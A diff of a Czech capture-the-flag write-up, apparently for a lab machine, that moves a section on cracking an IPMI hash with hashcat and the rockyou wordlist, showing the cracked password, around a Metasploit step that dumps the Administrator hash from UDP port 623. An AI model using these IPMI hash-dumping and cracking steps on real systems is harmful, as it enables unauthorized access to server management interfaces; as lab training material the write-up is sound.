@@ -38,6 +38,18 @@ PORT    STATE SERVICE
 623/udp open  asf-rmcp
 ```
 
+## Analýza zjištění
+
+### Lámání hesel nebo hashů
+
+Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
+```bash
+hashcat --force -m 7300 -a 0 "__CENSORED__:__CENSORED__" /usr/share/wordlists/rockyou.txt
+```
+```
+=> ilovepumkinpie1
+```
+
 ## Získání přístupu
 
 ### Spuštění exploitu
@@ -52,20 +64,6 @@ set RHOST 10.10.11.124
 
 [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:__CENSORED__:__CENSORED__
 ```
-
-## Analýza zjištění
-
-### Lámání hesel nebo hashů
-
-Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
-```bash
-hashcat --force -m 7300 -a 0 "__CENSORED__:__CENSORED__" /usr/share/wordlists/rockyou.txt
-```
-```
-=> ilovepumkinpie1
-```
-
-## Získání přístupu
 
 ### Získání user flagu
 
